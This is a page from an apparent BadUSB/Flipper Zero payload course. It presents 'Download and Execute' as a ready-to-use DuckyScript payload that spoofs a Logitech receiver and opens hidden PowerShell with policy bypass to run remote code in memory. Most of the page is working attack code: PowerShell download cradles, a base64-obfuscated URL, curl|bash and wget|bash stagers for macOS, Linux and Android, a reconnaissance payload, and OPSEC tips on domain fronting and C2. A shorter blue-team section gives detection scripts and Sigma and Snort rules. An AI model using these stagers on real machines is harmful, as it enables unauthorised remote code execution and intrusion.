# FZ-I07: Download and Execute

## Overview

| Property | Value |
|----------|-------|
| **ID** | FZ-I07 |
| **Name** | Download and Execute |
| **Difficulty** | Intermediate |
| **Target OS** | Windows 10/11 |
| **Execution Time** | ~8 seconds + download |
| **Network** | Requires internet/intranet |
| **MITRE ATT&CK** | T1105 (Ingress Tool Transfer), T1059.001 (PowerShell) |

## What This Payload Does

Downloads a remote payload (script, executable, or module) and executes it on the target system. This is a foundational technique for delivering larger payloads that exceed DuckyScript character limits.

---

## The Payload

```ducky
REM =============================================
REM INTERMEDIATE: Download and Execute
REM Target: Windows 10/11
REM Action: Downloads and runs remote payload
REM Network: Requires connectivity
REM Skill: Intermediate
REM WARNING: Executes remote code
REM =============================================

ID 046d:c52b Logitech:Unifying Receiver

DELAY 2500

REM Open hidden PowerShell
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1500

REM Download and execute in memory (fileless)
STRINGLN IEX (New-Object Net.WebClient).DownloadString('https://your-server.com/payload.ps1')
```

---

## Download Methods

### Method 1: WebClient (Classic)

```powershell
# Download string and execute (fileless)
IEX (New-Object Net.WebClient).DownloadString('https://server/script.ps1')

# Download file to disk
(New-Object Net.WebClient).DownloadFile('https://server/file.exe', "$env:TEMP\file.exe")
```

### Method 2: Invoke-WebRequest (PowerShell 3+)

```powershell
# Download and execute
IEX (Invoke-WebRequest -Uri 'https://server/script.ps1' -UseBasicParsing).Content

# Download file
Invoke-WebRequest -Uri 'https://server/file.exe' -OutFile "$env:TEMP\file.exe"
```

### Method 3: Invoke-RestMethod

```powershell
# For API-based delivery
IEX (Invoke-RestMethod -Uri 'https://server/api/payload')
```

### Method 4: .NET WebRequest

```powershell
# More control over request
$req = [System.Net.WebRequest]::Create('https://server/script.ps1')
$resp = $req.GetResponse()
$reader = New-Object System.IO.StreamReader($resp.GetResponseStream())
IEX $reader.ReadToEnd()
```

### Method 5: BitsTransfer (Background)

```powershell
# Uses BITS for download (can be more stealthy)
Start-BitsTransfer -Source 'https://server/file.exe' -Destination "$env:TEMP\file.exe"
& "$env:TEMP\file.exe"
```

---

## Payload Variations

### Basic Download and Run

```ducky
STRINGLN (New-Object Net.WebClient).DownloadFile('https://server/payload.exe','$env:TEMP\update.exe'); Start-Process "$env:TEMP\update.exe"
```

### Download, Verify, Execute

```ducky
STRINGLN $f="$env:TEMP\payload.exe"; (New-Object Net.WebClient).DownloadFile('https://server/payload.exe',$f); if((Get-FileHash $f).Hash -eq 'EXPECTED_HASH'){& $f}
```

### Encoded URL (Obfuscation)

```ducky
STRINGLN $u=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9zZXJ2ZXIvcGF5bG9hZC5wczE=')); IEX (New-Object Net.WebClient).DownloadString($u)
```

### Proxy-Aware Download

```ducky
STRINGLN $wc=New-Object Net.WebClient; $wc.Proxy=[Net.WebRequest]::GetSystemWebProxy(); $wc.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials; IEX $wc.DownloadString('https://server/payload.ps1')
```

---

## Cross-Platform Versions

### macOS

```ducky
DELAY 2500
GUI SPACE
DELAY 700
STRING terminal
ENTER
DELAY 1500
REM Download and execute script
STRINGLN curl -s https://server/payload.sh | bash

REM Or download file first
STRINGLN curl -o /tmp/payload.sh https://server/payload.sh && chmod +x /tmp/payload.sh && /tmp/payload.sh
```

### Linux

```ducky
DELAY 2500
CTRL ALT t
DELAY 1000
REM Using curl
STRINGLN curl -s https://server/payload.sh | bash

REM Using wget
STRINGLN wget -qO- https://server/payload.sh | bash

REM Download binary
STRINGLN wget -O /tmp/payload https://server/payload && chmod +x /tmp/payload && /tmp/payload
```

### Android (via Termux)

```ducky
DELAY 4000
GUI
DELAY 1000
STRING termux
ENTER
DELAY 3000
REM Install curl/wget if needed
STRINGLN pkg install curl -y
STRINGLN curl -s https://server/android_payload.sh | bash

REM Download APK (requires manual install)
STRINGLN curl -o /sdcard/Download/app.apk https://server/app.apk
REM User must manually install APK
```

### iOS

iOS does not allow downloading and executing arbitrary code via BadUSB. The only option is opening URLs in Safari:

```ducky
DELAY 5000
GUI SPACE
DELAY 1500
STRING https://server/ios-landing-page
ENTER
REM User would need to manually interact with page
```

---

## Server Setup Examples

### Python HTTP Server

```bash
# Simple server for testing
python3 -m http.server 8080

# With HTTPS (requires cert)
python3 -c "
import http.server, ssl
server = http.server.HTTPServer(('0.0.0.0', 443), http.server.SimpleHTTPRequestHandler)
server.socket = ssl.wrap_socket(server.socket, certfile='cert.pem', keyfile='key.pem', server_side=True)
server.serve_forever()
"
```

### PHP Server

```bash
php -S 0.0.0.0:8080
```

### Sample Payload (payload.ps1)

```powershell
# Example reconnaissance payload
$info = @{
    Hostname = $env:COMPUTERNAME
    Username = $env:USERNAME
    IP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notmatch '^(127|169)'}).IPAddress
    OS = (Get-WmiObject Win32_OperatingSystem).Caption
}
$info | ConvertTo-Json | Out-File "$env:TEMP\recon.txt"
```

---

## Red Team Perspective

### Delivery Infrastructure

| Method | Pros | Cons |
|--------|------|------|
| Own Server | Full control | Attributable |
| Cloud Storage | Legitimate traffic | May be blocked |
| Pastebin/GitHub | Blends in | Terms of service |
| CDN | Fast, global | Logs exist |

### OPSEC Considerations

1. **Use HTTPS** - Avoid plaintext payload transmission
2. **Domain Fronting** - Hide C2 behind CDN
3. **Short-lived URLs** - Reduce exposure window
4. **Payload Encryption** - Decrypt on target
5. **User-Agent Spoofing** - Mimic normal traffic

### Attack Chain

```
BadUSB → Download Stager → Download Full Payload → Execute → Establish C2
              ↑
          You are here
```

---

## Blue Team Perspective

### Detection Opportunities

1. **Network Traffic**
   - PowerShell making HTTP/S requests
   - Downloads to temp directories
   - Unusual user-agent strings

2. **Process Behavior**
   - PowerShell with network indicators
   - Child processes from downloaded files

3. **File System**
   - New executables in temp folders
   - Scripts created and deleted

### Detection Script

```powershell
# Check PowerShell for download activity
Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-PowerShell/Operational'
    Id=4104
} -MaxEvents 100 | Where-Object {
    $_.Message -match 'DownloadString|DownloadFile|Invoke-WebRequest|wget|curl|WebClient|BitsTransfer'
} | Select TimeCreated, @{N='Script';E={$_.Message.Substring(0,500)}}
```

### Sigma Rule

```yaml
title: PowerShell Download and Execute
status: experimental
description: Detects PowerShell downloading and executing remote code
logsource:
    product: windows
    category: ps_script
detection:
    selection_download:
        ScriptBlockText|contains:
            - 'DownloadString'
            - 'DownloadFile'
            - 'Invoke-WebRequest'
            - 'WebClient'
            - 'Net.WebClient'
            - 'BitsTransfer'
    selection_execute:
        ScriptBlockText|contains:
            - 'IEX'
            - 'Invoke-Expression'
            - 'Start-Process'
            - '| bash'
    condition: selection_download and selection_execute
level: high
tags:
    - attack.execution
    - attack.t1105
    - attack.t1059.001
```

### Network Detection (Snort)

```
alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Potential PowerShell Download"; content:"powershell"; nocase; content:"GET"; http_method; content:".ps1"; http_uri; sid:1000001; rev:1;)
```

### Prevention

1. **Application Control**
   - Block PowerShell for standard users
   - Constrained Language Mode

2. **Network Controls**
   - Web proxy with SSL inspection
   - Block uncategorized sites

3. **Endpoint Protection**
   - AMSI for PowerShell scanning
   - EDR behavioral detection

---

## Practice Exercises

### Exercise 1: Safe Download Test
Download a file without executing:
```ducky
STRINGLN Invoke-WebRequest -Uri 'https://httpbin.org/get' -OutFile "$env:TEMP\test.json"
```

### Exercise 2: Check Connectivity
Test if target can reach your server:
```ducky
STRINGLN Test-NetConnection -ComputerName "your-server.com" -Port 443
```

### Exercise 3: Proxy Detection
Check if target uses a proxy:
```ducky
STRINGLN [Net.WebRequest]::GetSystemWebProxy().GetProxy('https://google.com')
```

---

## Payload File

Save as `FZ-I07_Download_Execute.txt`:

```ducky
REM FZ-I07: Download and Execute
ID 046d:c52b Logitech:Unifying Receiver
DELAY 2500
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1500
STRINGLN $wc=New-Object Net.WebClient;$wc.Proxy=[Net.WebRequest]::GetSystemWebProxy();$wc.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $wc.DownloadString('https://your-server.com/payload.ps1')
```

---

[← FZ-I06 Scheduled Task Persistence](FZ-I06_Scheduled_Task_Persistence.md) | [Back to Intermediate](README.md) | [Next: FZ-I08 Clipboard Capture →](FZ-I08_Clipboard_Capture.md)
